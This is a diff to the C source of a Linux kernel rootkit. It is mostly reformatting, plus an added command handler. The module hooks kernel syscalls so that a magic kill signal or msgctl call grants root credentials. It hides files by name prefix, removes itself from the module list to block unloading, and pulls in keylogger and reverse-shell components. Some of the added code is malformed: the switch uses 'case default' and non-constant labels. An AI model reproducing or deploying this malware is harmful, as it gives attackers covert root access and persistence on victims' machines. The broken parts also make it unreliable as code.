@@ -3,24 +3,24 @@
  * @author  Aaron Lichtman
  * @brief   A rootkit. // TODO: Expand description
  */
+#include <asm/unistd.h>
+#include <linux/cred.h>
+#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/ipc.h>
+#include <linux/jiffies.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/init.h>
-#include <linux/fs.h>
-#include <linux/types.h>
-#include <linux/jiffies.h>
-#include <linux/timer.h>
-#include <linux/threads.h>
-#include <linux/syscalls.h>
-#include <linux/sched.h>
-#include <linux/pid.h>
-#include <linux/cred.h>
-#include <linux/unistd.h>
-#include <asm/unistd.h>
-#include <linux/signal.h>
-#include <net/inet_sock.h>
 #include <linux/net.h>
-#include <linux/ipc.h>
+#include <linux/pid.h>
+#include <linux/sched.h>
+#include <linux/signal.h>
+#include <linux/syscalls.h>
+#include <linux/threads.h>
+#include <linux/timer.h>
+#include <linux/types.h>
+#include <linux/unistd.h>
+#include <net/inet_sock.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -36,9 +36,9 @@ MODULE_LICENSE("GPL");  // So the kernel doesn't complain about proprietary code
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
 typedef struct legacy_timer_emu {
-	struct timer_list t;
-	void (*function)(unsigned long);
-	unsigned long data;
+    struct timer_list t;
+    void (*function)(unsigned long);
+    unsigned long data;
 } _timer;
 #else
 typedef struct timer_list _timer;
@@ -46,29 +46,28 @@ typedef struct timer_list _timer;
 
 // TODO: Extract this to an h file to avoid duplication.
 typedef struct function_code {
-  int get_root;
-  int keylogger_enable;
-  int keylogger_disable;
-  int file_hide_add;
-  int file_hide_rm;
-  int file_hide_show;
-  int reverse_tcp_shell;
+    int get_root;
+    int keylogger_enable;
+    int keylogger_disable;
+    int file_hide_add;
+    int file_hide_rm;
+    int file_hide_show;
+    int reverse_tcp_shell;
 } function_code;
 
 function_code functionCode = {
-	.get_root = 0,
-	.keylogger_enable = 1,
-	.keylogger_disable = 2,
-	.file_hide_add = 3,
-	.file_hide_rm = 4,
-	.file_hide_show = 5,
-	.reverse_tcp_shell = 6
-};
+    .get_root = 0,
+    .keylogger_enable = 1,
+    .keylogger_disable = 2,
+    .file_hide_add = 3,
+    .file_hide_rm = 4,
+    .file_hide_show = 5,
+    .reverse_tcp_shell = 6};
 
 // This action_task struct is what is actually passed to the LKM.
 typedef struct action_task {
-  int func_code;
-  char *file_hide_str;
+    int func_code;
+    char *file_hide_str;
 } action_task;
 
 /**
@@ -109,35 +108,66 @@ static void do_something_on_interval(unsigned long data);
  */
 
 void log_info(const char *message) {
-	printk(KERN_EMERG "GARDEN: %s", message);
+    printk(KERN_INFO "GARDEN: %s", message);
 }
 
 void log_error(const char *message) {
-	printk(KERN_ERR "GARDEN: %s", message);
+    printk(KERN_ERR "GARDEN: %s", message);
 }
 
 /**
- * Hook for communication with kernel from user program. If both msqid and cmd
- * are -1 and buf is a NULL pointer, the next call to this function is a command.
- * If incoming_command_flag is set, and both msqid and cmd are -1, the
- * msquid_ds struct should be cast to an action_task * and processed.
+ * Handler for incoming action_tasks. Frees task memory if it doesn't return.
+ */
+int handle_task(action_task *task) {
+    printk(KERN_EMERG "Handling function code: %d\n", task->func_code);
+    switch (task->func_code) {
+        case functionCode.get_root:
+            return get_root();
+        case functionCode.keylogger_enable:
+            // TODO
+            break;
+        case functionCode.keylogger_disable:
+            // TODO
+            break;
+        case functionCode.file_hide_add:
+            // TODO
+            break;
+        case functionCode.file_hide_rm:
+            // TODO
+            break;
+        case functionCode.file_hide_show:
+            // TODO
+            break;
+        case functionCode.reverse_tcp_shell:
+
+            // TODO
+            break;
+        case default:
+            printk(KERN_ERR "Unexpected function code. This shouldn't be possible.\n");
+            return -1;
+    };
+}
+
+/**
+ * Hook for communication with kernel from user program. If the first two arguments
+ * are INT_MAX, then the third argument is a pointer to an action task_ struct.
+ * Copy that from userspace and process it.
  */
 KHOOK_EXT(long, __x64_sys_msgctl, const struct pt_regs *);
 static long khook___x64_sys_msgctl(const struct pt_regs *regs) {
-	action_task* task;
-	task = kmalloc(MAX_TASK_SIZE + 1, GFP_KERNEL);
-	printk("%s -- msqid:%ld cmd:%ld ptr:%p\n", current->comm, regs->di, regs->si, (void *)regs->dx);
-	// int msqid, int cmd, struct msqid_ds __user *buf
+    action_task *task;
+    int error;
 
-	// Read first two arguments
-	if (regs->di == INT_MAX && regs->si == INT_MAX) {
-			printk(KERN_EMERG "sys_msgctl --Incoming command\n");
-			copy_from_user(task, (const void*) regs->dx, MAX_TASK_SIZE);
-			printk(KERN_EMERG "FUNC CODE: %d\n", task->func_code);
-			return 0;
-	} else {
-		return KHOOK_ORIGIN(__x64_sys_msgctl, regs);
-	}
+    if (regs->di == INT_MAX && regs->si == INT_MAX) {
+        printk(KERN_EMERG "sys_msgctl --Incoming command\n");
+        task = kmalloc(MAX_TASK_SIZE + 1, GFP_KERNEL);
+        copy_from_user(task, (const void *)regs->dx, MAX_TASK_SIZE);
+        error = handle_task(task);
+        kfree(task);
+        return error;
+    } else {
+        return KHOOK_ORIGIN(__x64_sys_msgctl, regs);
+    }
 }
 
 /**
@@ -149,79 +179,78 @@ static long khook___x64_sys_msgctl(const struct pt_regs *regs) {
  * If this method returns true, the file in question should be hidden.
  */
 static bool should_hide_file(const char *name) {
-	if (hidden_file_prefix && ! strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
-		printk(KERN_INFO "Hiding: %s\n", name);
-		return true;
-	}
-	return false;
+    if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
+        printk(KERN_INFO "Hiding: %s\n", name);
+        return true;
+    }
+    return false;
 }
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-	if (should_hide_file(name)) {
-		return 0;
-	}
-	return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-	if (should_hide_file(name)) {
-		return 0;
-	}
-	return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir64(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-	if (should_hide_file(name)) {
-		return 0;
-	}
-	return KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_compat_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-	if (should_hide_file(name)) {
-		return 0;
-	}
-	return KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_compat_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
-	if (should_hide_file(name)) {
-		return 0;
-	}
-	return KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
 }
 
 KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
 struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name) {
-	if (should_hide_file(name->name)) {
-		return NULL;
-	}
-	return KHOOK_ORIGIN(__d_lookup, parent, name);
+    if (should_hide_file(name->name)) {
+        return NULL;
+    }
+    return KHOOK_ORIGIN(__d_lookup, parent, name);
 }
 
 /**
  * Drops the current user into a root shell.
  */
 static int get_root(void) {
-	struct cred* root_creds;
-	printk(KERN_EMERG "One root coming right up.");
-	root_creds = prepare_kernel_cred(NULL);
-	return commit_creds(root_creds);
+    struct cred *root_creds;
+    printk(KERN_EMERG "One root coming right up.");
+    root_creds = prepare_kernel_cred(NULL);
+    return commit_creds(root_creds);
 }
 
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
 static long khook___x64_sys_kill(const struct pt_regs *regs) {
-	if (regs->di == MAGIC_ROOT_NUM) {
-		return get_root();
-	}
-	return KHOOK_ORIGIN(__x64_sys_kill, regs);
+    if (regs->di == MAGIC_ROOT_NUM) {
+        return get_root();
+    }
+    return KHOOK_ORIGIN(__x64_sys_kill, regs);
 }
-
 
 /**
  * Timer and Command Polling Functions
@@ -230,37 +259,37 @@ static long khook___x64_sys_kill(const struct pt_regs *regs) {
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
 static void legacy_timer_function_wrapper(struct timer_list *timer) {
-	struct legacy_timer_emu *legacy_timer = from_timer(legacy_timer, timer, t);
-	// NOTE: legacy_timer->data is currently always NULL, but may not be in the future.
-	legacy_timer->function(legacy_timer->data);
+    struct legacy_timer_emu *legacy_timer = from_timer(legacy_timer, timer, t);
+    // NOTE: legacy_timer->data is currently always NULL, but may not be in the future.
+    legacy_timer->function(legacy_timer->data);
 }
 #endif
 
 __inline void timer_init_wrapper(_timer *timer, void *func) {
-	timer->data = 0;
-	timer->function = func;
+    timer->data = 0;
+    timer->function = func;
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
-	timer_setup(&timer->t, legacy_timer_function_wrapper, 0);
+    timer_setup(&timer->t, legacy_timer_function_wrapper, 0);
 #else
-	init_timer(timer);
+    init_timer(timer);
 #endif
 }
 
 __inline static void set_timer(_timer *timer) {
-	unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
+    unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
-	mod_timer(&timer->t, expires);
+    mod_timer(&timer->t, expires);
 #else
-	mod_timer(timer, expires);
+    mod_timer(timer, expires);
 #endif
-	// printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
+    // printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
 }
 
 __inline static void timer_cleanup_wrapper(_timer *timer) {
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
-	del_timer_sync(&timer->t);
+    del_timer_sync(&timer->t);
 #else
-	del_timer_sync(timer);
+    del_timer_sync(timer);
 #endif
 }
 
@@ -270,39 +299,39 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
  * NOTE: The data parameter is required in order for this to compile.
  */
 static void do_something_on_interval(unsigned long data) {
-	// TODO: Exfiltrate data.
-	set_timer(&polling_timer);
+    // TODO: Exfiltrate data.
+    set_timer(&polling_timer);
 }
 
 /**
  * Rootkit module initialization.
  */
 static int __init rootkit_init(void) {
-	printk(KERN_EMERG "Initializing rootkit...\n");
-	khook_init();
+    printk(KERN_EMERG "Initializing rootkit...\n");
+    khook_init();
 
-	printk(KERN_EMERG "Initializing timer...\n");
-	timer_init_wrapper(&polling_timer, do_something_on_interval);
-	set_timer(&polling_timer);
+    printk(KERN_EMERG "Initializing timer...\n");
+    timer_init_wrapper(&polling_timer, do_something_on_interval);
+    set_timer(&polling_timer);
 
-	if (block_removal) {
-		printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
-		list_del_init(&__this_module.list);
-		kobject_del(&THIS_MODULE->mkobj.kobj);
-	}
+    if (block_removal) {
+        printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
+        list_del_init(&__this_module.list);
+        kobject_del(&THIS_MODULE->mkobj.kobj);
+    }
 
-	// Gotta make the compiler happy.
-	do_something_on_interval(0);
-	return 0;
+    // Gotta make the compiler happy.
+    do_something_on_interval(0);
+    return 0;
 }
 
 /**
  * Called when $ rmmod is executed. Cleans up rootkit nicely.
  */
 static void __exit rootkit_exit(void) {
-	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
-	khook_cleanup();
-	timer_cleanup_wrapper(&polling_timer);
+    printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
+    khook_cleanup();
+    timer_cleanup_wrapper(&polling_timer);
 }
 
 module_init(rootkit_init);
